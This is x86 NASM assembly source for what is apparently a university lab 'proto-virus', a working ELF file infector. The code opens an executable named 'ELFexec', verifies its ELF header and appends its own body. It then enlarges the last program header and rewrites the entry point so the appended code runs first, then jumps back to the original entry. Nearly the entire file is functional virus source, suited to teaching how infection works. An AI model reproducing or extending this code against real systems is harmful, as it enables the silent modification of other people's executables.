%macro syscall 2
    mov ebx, %2
    mov eax, %1
    int 0x80
%endmacro

%macro syscall 4
    mov edx, %4
    mov ecx, %3
    mov ebx, %2
    mov eax, %1
    int 0x80
%endmacro

%macro exit 1
    syscall 1, %1
%endmacro

%macro write 3
    syscall 4, %1, %2, %3
%endmacro

%macro read 3
    syscall 3, %1, %2, %3
%endmacro

%macro open 3
    syscall 5, %1, %2, %3
%endmacro

%macro lseek 3
    syscall 19, %1, %2, %3
%endmacro

%macro close 1
    syscall 6, %1
%endmacro

%define p_anchor eax

%macro get_lbl_loc 1
    call get_anchor_loc
    add p_anchor, (%1-anchor)
%endmacro

%macro get_lbl_loc 2
    get_lbl_loc %2
    mov %1, p_anchor
%endmacro

%macro seek_to_start 1
    lseek %1, 0, SEEK_SET
%endmacro
%macro seek_to_end 1
    lseek %1, 0, SEEK_END
%endmacro

%macro lea_stack_var 2-3 eax
    lea %3, %2
    mov %1, %3
%endmacro

%define STK_RES 200
%define RDWR    2
%define SEEK_END 2
%define SEEK_SET 0

%define ELF_HEADER_SIZE 52
%define ENTRY           24
%define EHDR_phoff      28
%define EHDR_phnum      44

%define PHDR_SIZE     32
%define PHDR_offset   4
%define PHDR_vaddr    8
%define PHDR_filesize 16
%define PHDR_memsize  20
%define PHDR_start    28

%define stdout 1
CODE_SIZE EQU (virus_end - virus_start)
CODE_START_OFFSET EQU (_start - virus_start)

global _start

section .text
virus_start:
nop

get_anchor_loc:
    call anchor
anchor:
    pop p_anchor
    ret

_start:
    %push
    push ebp
    mov ebp, esp
    sub esp, STK_RES ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
    %xdefine %$base 0
    %xdefine %$loc ebp-4
    %xdefine %$p_stack_var ebp-8
    %xdefine %$fd ebp-12
    %xdefine %$fsz ebp-16

    ; task 0b
    %xdefine %$base 16
    %xdefine %$mag ebp-(%$base+4)

    ; task 1
    %xdefine %$base 20
    %xdefine %$exe_code_start_vaddr ebp-(%$base+4)

    ; task 2
    %xdefine %$base 24
    %xdefine %$exe_entry_point ebp-(%$base+4)
    
    %xdefine %$base (28+ELF_HEADER_SIZE)
    %xdefine %$elf_header ebp-%$base

    ; task 3
    %xdefine %$phoff ebp-(%$base+4)
    %xdefine %$phnum ebp-(%$base+8)
    %xdefine %$last_ph_offset ebp-(%$base+12)

    %xdefine %$base (40+ELF_HEADER_SIZE+PHDR_SIZE)
    %xdefine %$ph ebp-%$base

    .print_msg:
    get_lbl_loc [%$loc], OutStr
    write stdout, [%$loc], OutStr_len

    .open_elf_file:
    get_lbl_loc [%$loc], FileName
    open [%$loc], RDWR, 0
    
    .check_open:
    cmp eax, 0
    jg .open_success

    .open_failed:
    mov dword [ebp-8], eax
    get_lbl_loc [%$loc], Failstr
    write stdout, [%$loc], Failstr_len
    exit 1

    .open_success:
    mov dword [%$fd], eax

    .read_elf_magic_number:
    lea_stack_var [%$p_stack_var], [%$mag]
    read [%$fd], [%$p_stack_var], 4

    .check_elf_magic_number:
    cmp byte [%$mag], 0x7f
    jne .invalid_elf_magic_number
    cmp byte [%$mag+1], 'E'
    jne .invalid_elf_magic_number
    cmp byte [%$mag+2], 'L'
    jne .invalid_elf_magic_number
    cmp byte [%$mag+3], 'F'
    jne .invalid_elf_magic_number
    .valid_elf_magic_number:
    jmp .end_check_elf_magic_number
    .invalid_elf_magic_number:
    get_lbl_loc [%$loc], Failstr
    write stdout, [%$loc], Failstr_len
    exit 2
    .end_check_elf_magic_number:
    nop

    .append_virus_code:
    seek_to_end [%$fd]
    mov [%$fsz], eax
    get_lbl_loc [%$loc], virus_start
    write [%$fd], [%$loc], CODE_SIZE

    .read_elf_header:
    seek_to_start [%$fd]
    lea_stack_var [%$p_stack_var], [%$elf_header]
    read [%$fd], [%$p_stack_var], ELF_HEADER_SIZE

    .save_original_entry_point:
    mov eax, dword [%$elf_header+ENTRY]
    mov dword [%$exe_entry_point], eax

    .write_previous_entry_point:
    lseek [%$fd], -4, SEEK_END
    lea_stack_var [%$p_stack_var], [%$exe_entry_point]
    write [%$fd], [%$p_stack_var], 4

    .read_elf_ph_info:
    movzx eax, word [%$elf_header+EHDR_phnum]
    mov dword [%$phnum], eax
    mov eax, dword [%$elf_header+EHDR_phoff]
    mov dword [%$phoff], eax

    .calc_last_ph_offset:
    mov eax, [%$phnum]
    dec eax
    mov ebx, PHDR_SIZE
    mul ebx
    mov ebx, [%$phoff]
    add eax, ebx
    mov dword [%$last_ph_offset], eax
    
    .read_last_ph:
    lseek [%$fd], [%$last_ph_offset], SEEK_SET
    lea_stack_var [%$p_stack_var], [%$ph]
    read [%$fd], [%$p_stack_var], PHDR_SIZE

    .set_last_ph_sizes:
    mov eax, 0
    add eax, dword [%$fsz]
    sub eax, dword [%$ph+PHDR_offset]
    add eax, dword CODE_SIZE
    mov dword [%$ph+PHDR_filesize], eax
    mov dword [%$ph+PHDR_memsize], eax

    .write_last_ph_back:
    lseek [%$fd], [%$last_ph_offset], SEEK_SET
    lea_stack_var [%$p_stack_var], [%$ph]
    write [%$fd], [%$p_stack_var], PHDR_SIZE

    .read_base_address:
    mov eax, dword [%$ph+PHDR_vaddr]
    sub eax, dword [%$ph+PHDR_offset]
    mov dword [%$exe_code_start_vaddr], eax

    .set_new_entry_point:
    mov eax, 0
    add eax, dword [%$exe_code_start_vaddr]
    add eax, dword [%$fsz]
    add eax, dword CODE_START_OFFSET
    mov dword [%$elf_header+ENTRY], eax

    .write_elf_header_back_to_file:
    seek_to_start [%$fd]
    lea_stack_var [%$p_stack_var], [%$elf_header]
    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE

    .close_file:
    close [%$fd]

    .jump_to_previous_entry_point:
    get_lbl_loc PreviousEntryPoint
    jmp [p_anchor]

VirusExit:
       exit 0 ; Termination if all is OK and no previous code to jump to
              ; (also an example for use of above macros)
    
FileName: db "ELFexec", 0

OutStr: db "The lab 9 proto-virus strikes!", 10, 0
OutStr_len EQU $ - OutStr - 1

Failstr: db "perhaps not", 10 , 0
Failstr_len EQU $ - Failstr - 1

PreviousEntryPoint: dd VirusExit
virus_end:

%pop
